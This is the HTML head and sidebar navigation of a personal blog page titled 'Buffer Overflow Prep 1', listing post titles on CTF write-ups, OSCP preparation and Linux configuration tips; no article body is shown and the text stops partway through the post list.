<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Buffer Overflow Prep 1 | Peanutstick</title>
  <meta name="keywords" content=" Linux ">
  <meta name="description" content="Buffer Overflow Prep 1 | Peanutstick">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="NoteJohn was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?  nampnmap -A -sV -p-">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF Bugged">
<meta property="og:url" content="https://peanutstick.github.io/post/CTF%20Bugged.html">
<meta property="og:site_name" content="Peanutstick">
<meta property="og:description" content="NoteJohn was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?  nampnmap -A -sV -p-">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.imgur.com/KFWJeod.png">
<meta property="og:image" content="https://i.imgur.com/xMLyBtO.png">
<meta property="og:image" content="https://i.imgur.com/UYmi5Ni.png">
<meta property="article:published_time" content="2023-03-09T01:00:52.000Z">
<meta property="article:modified_time" content="2023-03-07T18:33:40.484Z">
<meta property="article:author" content="Peanutstick">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/KFWJeod.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>


<script id="dsq-count-scr" src="//peanutstick.disqus.com/count.js" async></script>


<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 5.4.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="true">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>Peanutstick</span>
</div>

<div class="icon">
    
        
    
        
            <a title="github"
               href="https://github.com/Peanutstick"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
        
            <a title="reddit"
               href="https://www.reddit.com/user/benjy500c/"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-reddit"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
</div>




<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(100)</small>
            
        </div>
    </li>
    
        
            
                <li>
                    <div data-rel="CTF">
                        
                        CTF
                        <small>(53)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Fix">
                        
                        Fix
                        <small>(5)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Os">
                        
                        Os
                        <small>(19)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Programing">
                        
                        Programing
                        <small>(3)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Security">
                        
                        Security
                        <small>(7)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Service">
                        
                        Service
                        <small>(5)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Tips">
                        
                        Tips
                        <small>(8)</small>
                        
                    </div>
                    
                </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">About</a>
        
        <a style="width: 50%"
                
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="100">
<input type="hidden" id="yelog_site_word_count" value="50.9k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://irc.evilcorp.ga/">Evilcorp</a></li>
            
            <li><a target="_blank" href="https://github.com/TripleZer000">TripleZer0</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">Contents</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>IRC Python</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Linux</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Linux, Gaming</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Pentest</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Security</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Tor</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>VPN</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        <a  class="All CTF "
           href="/post/CTF%20Bugged.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Bugged">CTF Bugged</span>
            <span class="post-date" title="2023-03-09 02:00:52">2023/03/09</span>
        </a>
        
        <a  class="All Security "
           href="/post/Intro%20To%20Pwntools.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Intro To Pwntools">Intro To Pwntools</span>
            <span class="post-date" title="2023-03-01 00:40:52">2023/03/01</span>
        </a>
        
        <a  class="All Security "
           href="/post/Buffer%20Overflow%20Prep%202.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Buffer Overflow Prep 2">Buffer Overflow Prep 2</span>
            <span class="post-date" title="2023-02-26 17:10:52">2023/02/26</span>
        </a>
        
        <a  class="All Security "
           href="/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Buffer Overflow Prep 1">Buffer Overflow Prep 1</span>
            <span class="post-date" title="2023-02-25 21:30:52">2023/02/25</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_BoilCTF.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF BoilCTF">CTF BoilCTF</span>
            <span class="post-date" title="2023-02-19 19:00:55">2023/02/19</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Wekor.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Wekor">CTF Wekor</span>
            <span class="post-date" title="2023-02-19 04:57:52">2023/02/19</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Plotted-LMS.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Plotted-LMS">CTF Plotted-LMS</span>
            <span class="post-date" title="2023-02-16 15:30:52">2023/02/16</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Install%20of%20kali%20on%20Arch%20with%20QEMU.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Install Kali with QEMU">Install Kali with QEMU</span>
            <span class="post-date" title="2023-02-11 01:56:09">2023/02/11</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Cheat%20sheet.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Cheat Sheet for the OSCP">Cheat Sheet for the OSCP</span>
            <span class="post-date" title="2023-02-07 03:09:52">2023/02/07</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Wgel_CTF.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Wgel CTF">CTF Wgel CTF</span>
            <span class="post-date" title="2023-02-05 19:20:02">2023/02/05</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Year%20of%20the%20Rabbit.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Year of the Rabbit">CTF Year of the Rabbit</span>
            <span class="post-date" title="2023-02-02 19:20:02">2023/02/02</span>
        </a>
        
        <a  class="All Security "
           href="/post/CVE-2023-24055_KeePass_2.5x.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CVE-2023-24055 KeePass 2.5x">CVE-2023-24055 KeePass 2.5x</span>
            <span class="post-date" title="2023-01-31 05:15:52">2023/01/31</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Ignite.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Ignite">CTF Ignite</span>
            <span class="post-date" title="2023-01-29 18:20:02">2023/01/29</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Learn%20CTF%20on%20windows.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Learn CTF on windows">Learn CTF on windows</span>
            <span class="post-date" title="2023-01-14 19:26:00">2023/01/14</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Relevant.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Relevant">CTF Relevant</span>
            <span class="post-date" title="2023-01-13 11:18:57">2023/01/13</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Bypass%20yt%20restriction.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Bypass yt restriction">Bypass yt restriction</span>
            <span class="post-date" title="2023-01-12 22:25:02">2023/01/12</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Daily%20Bugle.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF  Daily Bugle">CTF  Daily Bugle</span>
            <span class="post-date" title="2023-01-12 19:20:02">2023/01/12</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Internal.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Internal">CTF Internal</span>
            <span class="post-date" title="2023-01-11 19:20:02">2023/01/11</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Mr_Robot_HTB.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Mr Robot">CTF Mr Robot</span>
            <span class="post-date" title="2023-01-09 02:51:02">2023/01/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Crocc%20Crew.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Crocc Crew">CTF Crocc Crew</span>
            <span class="post-date" title="2022-12-23 08:02:40">2022/12/23</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Init.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Init">CTF Init</span>
            <span class="post-date" title="2022-11-13 12:14:10">2022/11/13</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_SecretRezip.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF SecretRezip">CTF SecretRezip</span>
            <span class="post-date" title="2022-11-10 20:25:36">2022/11/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Hackfest%202016.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Hackfest 2016">CTF Hackfest 2016</span>
            <span class="post-date" title="2022-10-26 20:21:07">2022/10/26</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Eric.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Eric">CTF Eric</span>
            <span class="post-date" title="2022-10-20 14:11:51">2022/10/20</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Hacksudo3.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Hacksudo3">CTF Hacksudo3</span>
            <span class="post-date" title="2022-10-18 18:48:30">2022/10/18</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Micro_Storage.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Micro Storage">CTF Micro Storage</span>
            <span class="post-date" title="2022-10-16 22:25:19">2022/10/16</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Eternal%20Loop.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Eternal Loop">Eternal Loop</span>
            <span class="post-date" title="2022-09-26 02:15:52">2022/09/26</span>
        </a>
        
        <a  class="All Os "
           href="/post/Fresh%20install%20of%20Arch.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Fresh install of Arch">Fresh install of Arch</span>
            <span class="post-date" title="2022-07-09 19:30:52">2022/07/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/DIGITALWORLD%20FALL.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="DIGITALWORLD: FALL ">DIGITALWORLD: FALL </span>
            <span class="post-date" title="2022-07-03 06:30:52">2022/07/03</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Victim%201.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Victim1: ">CTF Victim1: </span>
            <span class="post-date" title="2022-06-26 23:48:52">2022/06/26</span>
        </a>
        
        <a  class="All Os "
           href="/post/Linux%20From%20Scratch.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Install Linux From Scratch">Install Linux From Scratch</span>
            <span class="post-date" title="2022-06-18 23:48:52">2022/06/18</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Silky_0x01.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Silky 0x01">CTF Silky 0x01</span>
            <span class="post-date" title="2022-06-12 18:44:52">2022/06/12</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Beelzebub.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Beelzebub">CTF Beelzebub</span>
            <span class="post-date" title="2022-06-09 19:29:02">2022/06/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Shibboleth.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Shibboleth">CTF Shibboleth</span>
            <span class="post-date" title="2022-03-13 00:29:02">2022/03/13</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_PwnLab.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF PwnLab">CTF PwnLab</span>
            <span class="post-date" title="2022-03-06 04:07:56">2022/03/06</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Simple_CTF.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF simple CTF">CTF simple CTF</span>
            <span class="post-date" title="2022-03-03 01:20:52">2022/03/03</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_hacker_kid.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF hacker kid">CTF hacker kid</span>
            <span class="post-date" title="2022-02-28 03:19:25">2022/02/28</span>
        </a>
        
        <a  class="All Tips "
           href="/post/How_to_gain_some_GiB_on_Arch_Linux.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="How to gain some GiB on Arch Linux">How to gain some GiB on Arch Linux</span>
            <span class="post-date" title="2022-02-21 03:15:52">2022/02/21</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_jordaninfosec.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Jordaninfosec">CTF Jordaninfosec</span>
            <span class="post-date" title="2022-02-17 22:11:00">2022/02/17</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Deathnote.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Deathnote">CTF Deathnote</span>
            <span class="post-date" title="2022-02-08 02:20:57">2022/02/08</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Paper.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Paper">CTF Paper</span>
            <span class="post-date" title="2022-02-06 04:07:56">2022/02/06</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Pandora.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Pandora">CTF Pandora</span>
            <span class="post-date" title="2022-02-05 01:30:52">2022/02/05</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Meta.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Meta">CTF Meta</span>
            <span class="post-date" title="2022-02-02 03:15:02">2022/02/02</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Secret.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Secret">CTF Secret</span>
            <span class="post-date" title="2022-01-31 00:29:02">2022/01/31</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Backdoor.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Backdoor">CTF Backdoor</span>
            <span class="post-date" title="2022-01-29 22:19:25">2022/01/29</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Horizontall.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Horizontall">CTF Horizontall</span>
            <span class="post-date" title="2022-01-23 20:42:51">2022/01/23</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Toppo.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Toppo">CTF Toppo</span>
            <span class="post-date" title="2022-01-22 17:54:42">2022/01/22</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Walpaper_selector_with_sxiv.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Wallpaper selector with sxiv">Wallpaper selector with sxiv</span>
            <span class="post-date" title="2022-01-22 02:35:56">2022/01/22</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_cybersploit.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF cybersploit">CTF cybersploit</span>
            <span class="post-date" title="2022-01-21 20:19:23">2022/01/21</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_unknowndevice64-1.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF unknowndevice64-1">CTF unknowndevice64-1</span>
            <span class="post-date" title="2022-01-19 20:51:42">2022/01/19</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Record_screen_with_ffmpeg.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Record screen with ffmpeg">Record screen with ffmpeg</span>
            <span class="post-date" title="2022-01-19 01:56:09">2022/01/19</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_commands_and_files.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF commands and files">CTF commands and files</span>
            <span class="post-date" title="2022-01-17 22:55:38">2022/01/17</span>
        </a>
        
        <a  class="All Service "
           href="/post/set_up_smb.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="set up smb">set up smb</span>
            <span class="post-date" title="2022-01-16 05:01:27">2022/01/16</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Stapler.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Stapler">CTF Stapler</span>
            <span class="post-date" title="2022-01-15 01:07:29">2022/01/15</span>
        </a>
        
        <a  class="All Programing "
           href="/post/Create_a_polybar_module.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Create a polybar module">Create a polybar module</span>
            <span class="post-date" title="2022-01-12 23:09:01">2022/01/12</span>
        </a>
        
        <a  class="All Os "
           href="/post/Replacing_xfce4_bar_by_Polybar.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Replacing xfce4 bar by Polybar">Replacing xfce4 bar by Polybar</span>
            <span class="post-date" title="2022-01-12 00:57:59">2022/01/12</span>
        </a>
        
        <a  class="All Programing "
           href="/post/Script_to_create_my_article_page.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Script to create my article page.">Script to create my article page.</span>
            <span class="post-date" title="2022-01-11 22:30:34">2022/01/11</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Cut_an_online_video_with_ffmpeg.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Cut an online video with ffmpeg">Cut an online video with ffmpeg</span>
            <span class="post-date" title="2022-01-11 03:15:52">2022/01/11</span>
        </a>
        
        <a  class="All Service "
           href="/post/Stream_audio_video_at_home.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Create a locale stream">Create a locale stream</span>
            <span class="post-date" title="2022-01-09 19:18:22">2022/01/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_SickOs.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF_SickOs">CTF_SickOs</span>
            <span class="post-date" title="2022-01-09 01:15:52">2022/01/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Dina.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Dinae">CTF Dinae</span>
            <span class="post-date" title="2022-01-08 22:16:52">2022/01/08</span>
        </a>
        
        <a  class="All Tips "
           href="/post/weather.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Weather in CLI">Weather in CLI</span>
            <span class="post-date" title="2022-01-06 18:15:52">2022/01/06</span>
        </a>
        
        <a  class="All Os "
           href="/post/switch_from_i3_to_bspwm.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Switch from i3 to bspwm">Switch from i3 to bspwm</span>
            <span class="post-date" title="2022-01-01 01:37:52">2022/01/01</span>
        </a>
        
        <a  class="All Fix "
           href="/post/Fix_teams.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Fix my spyware is stuck in the login loop (Microsoft teams)">Fix my spyware is stuck in the login loop (Microsoft teams)</span>
            <span class="post-date" title="2021-12-27 21:15:52">2021/12/27</span>
        </a>
        
        <a  class="All Os "
           href="/post/nitrogen_with_wal.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="How do I setup nitrogen &amp; pywal">How do I setup nitrogen &amp; pywal</span>
            <span class="post-date" title="2021-12-25 03:15:52">2021/12/25</span>
        </a>
        
        <a  class="All Os "
           href="/post/Setup_Xfce_with_i3.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Setup_Xfce_with_i3">Setup_Xfce_with_i3</span>
            <span class="post-date" title="2021-12-24 05:17:00">2021/12/24</span>
        </a>
        
        <a  class="All Security "
           href="/post/Set_firewall_ufw.html"
           data-tag="Security"
           data-author="" >
            <span class="post-title" title="Set up a firewall with ufw">Set up a firewall with ufw</span>
            <span class="post-date" title="2021-11-01 20:05:52">2021/11/01</span>
        </a>
        
        <a  class="All Security "
           href="/post/Port_knocking.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Set up port knocking server to hide an open port">Set up port knocking server to hide an open port</span>
            <span class="post-date" title="2021-10-31 01:15:52">2021/10/31</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Ambassador.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Ambassador">CTF Ambassador</span>
            <span class="post-date" title="2021-10-10 03:09:05">2021/10/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_M0rsarchive.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF M0rsarchive">CTF M0rsarchive</span>
            <span class="post-date" title="2021-10-10 03:09:05">2021/10/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Photobomb.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Photobomb">CTF Photobomb</span>
            <span class="post-date" title="2021-10-09 18:09:05">2021/10/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Trick.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Trick">CTF Trick</span>
            <span class="post-date" title="2021-10-06 01:40:52">2021/10/06</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_IMF.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF IMF">CTF IMF</span>
            <span class="post-date" title="2021-10-04 01:40:52">2021/10/04</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Choppy.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Choppy">CTF Choppy</span>
            <span class="post-date" title="2021-10-02 01:15:52">2021/10/02</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Tr0ll.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Tr0ll">CTF Tr0ll</span>
            <span class="post-date" title="2021-10-02 01:15:52">2021/10/02</span>
        </a>
        
        <a  class="All Os "
           href="/post/Run_games_on_lutris_with_proton.html"
           data-tag="Linux, Gaming"
           data-author="" >
            <span class="post-title" title="Run non steam game with proton on lutris">Run non steam game with proton on lutris</span>
            <span class="post-date" title="2021-09-15 04:40:52">2021/09/15</span>
        </a>
        
        <a  class="All Os "
           href="/post/Add-windows-to-grub.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Add windows to grub">Add windows to grub</span>
            <span class="post-date" title="2021-08-28 07:54:52">2021/08/28</span>
        </a>
        
        <a  class="All Os "
           href="/post/gparted.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Resize the main partion with gparted">Resize the main partion with gparted</span>
            <span class="post-date" title="2021-08-27 17:08:52">2021/08/27</span>
        </a>
        
        <a  class="All Os "
           href="/post/cheat-sheet.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Cheat Sheet of the commands I use">Cheat Sheet of the commands I use</span>
            <span class="post-date" title="2021-08-08 17:15:52">2021/08/08</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Ted.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Ted">CTF Ted</span>
            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
        </a>
        
        <a  class="All Os "
           href="/post/Set_polybar_on_2_screen.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Set Polybar on 2 screens">Set Polybar on 2 screens</span>
            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
        </a>
        
        <a  class="All Os "
           href="/post/Change_screen_resolution.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Change screen resolution with xandr">Change screen resolution with xandr</span>
            <span class="post-date" title="2021-08-02 04:15:52">2021/08/02</span>
        </a>
        
        <a  class="All Fix "
           href="/post/Low_fps_in_games.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="My games are unplayable">My games are unplayable</span>
            <span class="post-date" title="2021-08-01 19:15:52">2021/08/01</span>
        </a>
        
        <a  class="All Os "
           href="/post/Set_shortcut_for_brightness.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Set shortcut with i3 for brightness.">Set shortcut with i3 for brightness.</span>
            <span class="post-date" title="2021-07-31 20:23:52">2021/07/31</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Inferno.html"
           data-tag="Pentest"
           data-author="" >
            <span class="post-title" title="CTF Inferno">CTF Inferno</span>
            <span class="post-date" title="2021-07-19 18:59:52">2021/07/19</span>
        </a>
        
        <a  class="All Fix "
           href="/post/Fix_picom_blur_not_working.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Fix the blur with picom">Fix the blur with picom</span>
            <span class="post-date" title="2021-07-18 22:40:52">2021/07/18</span>
        </a>
        
        <a  class="All Os "
           href="/post/Configure_touchpad_on_i3.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Configure the touchpad [I3]">Configure the touchpad [I3]</span>
            <span class="post-date" title="2021-07-16 02:16:52">2021/07/16</span>
        </a>
        
        <a  class="All Service "
           href="/post/Send_file_via_ssh.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Send a file via ssh">Send a file via ssh</span>
            <span class="post-date" title="2021-07-14 04:15:52">2021/07/14</span>
        </a>
        
        <a  class="All Os "
           href="/post/Install-nvidia-driver.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Install nvidia driver on Arch Linux">Install nvidia driver on Arch Linux</span>
            <span class="post-date" title="2021-07-13 17:48:52">2021/07/13</span>
        </a>
        
        <a  class="All Fix "
           href="/post/Restore-backup.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Restore a backup with timeshift">Restore a backup with timeshift</span>
            <span class="post-date" title="2021-07-12 01:59:52">2021/07/12</span>
        </a>
        
        <a  class="All Fix "
           href="/post/Repare-wine.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="wine: could not load kernel32.dll, status c0000135">wine: could not load kernel32.dll, status c0000135</span>
            <span class="post-date" title="2021-07-11 18:50:52">2021/07/11</span>
        </a>
        
        <a  class="All Os "
           href="/post/Create_new_partition_linux.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Add a partition in linux">Add a partition in linux</span>
